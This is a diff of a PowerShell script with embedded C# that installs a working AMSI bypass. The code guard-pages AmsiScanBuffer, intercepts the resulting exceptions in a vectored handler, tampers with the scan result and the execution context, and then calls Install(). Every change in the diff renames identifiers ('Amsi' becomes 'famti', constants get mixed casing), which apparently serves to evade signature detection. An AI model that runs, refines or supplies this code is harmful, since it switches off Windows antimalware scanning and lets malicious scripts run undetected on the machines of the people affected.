@@ -4,19 +4,19 @@ using System.Runtime.InteropServices;
 
 namespace Test
 {
-    public static class AmsiGuard
+    public static class famtiGuard
     {
         // ----------------------------
         // P/Invoke & constants
         // ----------------------------
-        private const uint PAGE_EXECUTE = 0x10;
-        private const uint PAGE_EXECUTE_READ = 0x20;
-        private const uint PAGE_GUARD = 0x100;
-        private const int EXCEPTION_CONTINUE_EXECUTION = -1;
-        private const int EXCEPTION_CONTINUE_SEARCH = 0;
+        private const uint PaGe_EXECUTE = 0x10;
+        private const uint PaGe_EXECUTE_READ = 0x20;
+        private const uint PaGe_GUARD = 0x100;
+        private const int eXceptioN_CONTINUE_EXECUTION = -1;
+        private const int eXceptioN_CONTINUE_SEARCH = 0;
 
         // exception codes (use your WinAPI definitions if you have them)
-        private const uint STATUS_GUARD_PAGE_VIOLATION = 0x80000001;
+        private const uint STATUS_GUARD_PaGe_VIOLATION = 0x80000001;
         private const uint STATUS_SINGLE_STEP = 0x80000004;
 
         // AMSI result clean value (as in your example)
@@ -62,15 +62,15 @@ namespace Test
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        private struct EXCEPTION_POINTERS
+        private struct eXceptioN_POINTERS
         {
             public IntPtr ExceptionRecord;
             public IntPtr ContextRecord;
         }
 
-        // minimal EXCEPTION_RECORD fields we use
+        // minimal eXceptioN_RECORD fields we use
         [StructLayout(LayoutKind.Sequential)]
-        private struct EXCEPTION_RECORD
+        private struct eXceptioN_RECORD
         {
             public uint ExceptionCode;
             public uint ExceptionFlags;
@@ -102,12 +102,12 @@ namespace Test
             public ushort SegSs;
             public uint EFlags;
 
-            public ulong Dr0;
-            public ulong Dr1;
-            public ulong Dr2;
-            public ulong Dr3;
-            public ulong Dr6;
-            public ulong Dr7;
+            public ulong dR0;
+            public ulong dR1;
+            public ulong dR2;
+            public ulong dR3;
+            public ulong dR6;
+            public ulong dR7;
 
             public ulong Rax;
             public ulong Rcx;
@@ -133,7 +133,7 @@ namespace Test
         // ----------------------------
         // State
         // ----------------------------
-        private static IntPtr pAmsiScanBuffer = IntPtr.Zero;
+        private static IntPtr pfamtiScanBuffer = IntPtr.Zero;
         private static IntPtr vectoredHandle = IntPtr.Zero;
         private static VectoredHandler handlerDelegate = null;
 
@@ -142,7 +142,7 @@ namespace Test
         // ----------------------------
         public static void Install()
         {
-            ResolveAmsi();
+            Resolvefamti();
 
             // create & store the delegate instance so GC won't collect it
             handlerDelegate = new VectoredHandler(Handler);
@@ -159,13 +159,13 @@ namespace Test
             SYSTEM_INFO sys;
             GetSystemInfo(out sys);
             ulong pageSize = sys.dwPageSize;  // Use actual page size!
-            ulong addr = (ulong)pAmsiScanBuffer.ToInt64();
+            ulong addr = (ulong)pfamtiScanBuffer.ToInt64();
             ulong pageBase = addr & ~((ulong)pageSize - 1);
             uint old;
 
             // Re-protect page with guard
             IntPtr basePtr = new IntPtr((long)pageBase);
-            bool ok = VirtualProtect(basePtr, (UIntPtr)pageSize, PAGE_EXECUTE_READ | PAGE_GUARD, out old);
+            bool ok = VirtualProtect(basePtr, (UIntPtr)pageSize, PaGe_EXECUTE_READ | PaGe_GUARD, out old);
             if (!ok)
             {
             }
@@ -175,7 +175,7 @@ namespace Test
         // ----------------------------
         // Resolver (simple)
         // ----------------------------
-        private static void ResolveAmsi()
+        private static void Resolvefamti()
         {
             IntPtr h = IntPtr.Zero;
             h = GetModuleHandle("amsi.dll");
@@ -190,7 +190,7 @@ namespace Test
             }
 
             IntPtr p = GetProcAddress(h, "AmsiScanBuffer");
-            pAmsiScanBuffer = p;
+            pfamtiScanBuffer = p;
         }
         // ----------------------------
         // Exception handler
@@ -198,25 +198,25 @@ namespace Test
         private static int Handler(IntPtr exceptionPointers)
         {
             // Marshal pointers
-            var ep = Marshal.PtrToStructure<EXCEPTION_POINTERS>(exceptionPointers);
-            var exRec = Marshal.PtrToStructure<EXCEPTION_RECORD>(ep.ExceptionRecord);
+            var ep = Marshal.PtrToStructure<eXceptioN_POINTERS>(exceptionPointers);
+            var exRec = Marshal.PtrToStructure<eXceptioN_RECORD>(ep.ExceptionRecord);
             var ctx = Marshal.PtrToStructure<CONTEXT64>(ep.ContextRecord);
 
-            // PAGE_GUARD hit
-            if (exRec.ExceptionCode == STATUS_GUARD_PAGE_VIOLATION)
+            // PaGe_GUARD hit
+            if (exRec.ExceptionCode == STATUS_GUARD_PaGe_VIOLATION)
             {
-                // ensure we have AmsiScanBuffer resolved
-                if (pAmsiScanBuffer == IntPtr.Zero)
+                // ensure we have famtiScanBuffer resolved
+                if (pfamtiScanBuffer == IntPtr.Zero)
                 {
-                    ResolveAmsi(); // try to resolve now
-                    if (pAmsiScanBuffer == IntPtr.Zero)
+                    Resolvefamti(); // try to resolve now
+                    if (pfamtiScanBuffer == IntPtr.Zero)
                     {
-                        return EXCEPTION_CONTINUE_SEARCH;
+                        return eXceptioN_CONTINUE_SEARCH;
                     }
                 }
 
-                // check exception address equals AmsiScanBuffer
-                if (exRec.ExceptionAddress == pAmsiScanBuffer)
+                // check exception address equals famtiScanBuffer
+                if (exRec.ExceptionAddress == pfamtiScanBuffer)
                 {
                     ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ctx.Rsp);
                     IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ctx.Rsp + (6 * 8)));
@@ -231,36 +231,36 @@ namespace Test
                 // write context back
                 Marshal.StructureToPtr(ctx, ep.ContextRecord, true);
 
-                return EXCEPTION_CONTINUE_EXECUTION;
+                return eXceptioN_CONTINUE_EXECUTION;
             }
 
-            // Single-step: reapply PAGE_GUARD to AmsiScanBuffer's page
+            // Single-step: reapply PaGe_GUARD to famtiScanBuffer's page
             if (exRec.ExceptionCode == STATUS_SINGLE_STEP)
             {
                 // Determine page base
                 SYSTEM_INFO sys;
                 GetSystemInfo(out sys);
                 ulong pageSize = sys.dwPageSize;  // Use actual page size!
-                ulong addr = (ulong)pAmsiScanBuffer.ToInt64();
+                ulong addr = (ulong)pfamtiScanBuffer.ToInt64();
                 ulong pageBase = addr & ~((ulong)pageSize - 1);
 
                 // Re-protect page with guard
                 IntPtr basePtr = new IntPtr((long)pageBase);
                 uint old;
-                bool ok = VirtualProtect(basePtr, (UIntPtr)pageSize, PAGE_EXECUTE_READ | PAGE_GUARD, out old);
+                bool ok = VirtualProtect(basePtr, (UIntPtr)pageSize, PaGe_EXECUTE_READ | PaGe_GUARD, out old);
                 if (!ok)
                 {
                 }
 
 
-                return EXCEPTION_CONTINUE_EXECUTION;
+                return eXceptioN_CONTINUE_EXECUTION;
             }
 
-            return EXCEPTION_CONTINUE_SEARCH;
+            return eXceptioN_CONTINUE_SEARCH;
         }
     }
 }
 "@
 
 Add-Type -TypeDefinition $Guard
-[Test.AmsiGuard]::Install()
+[Test.famtiGuard]::Install()
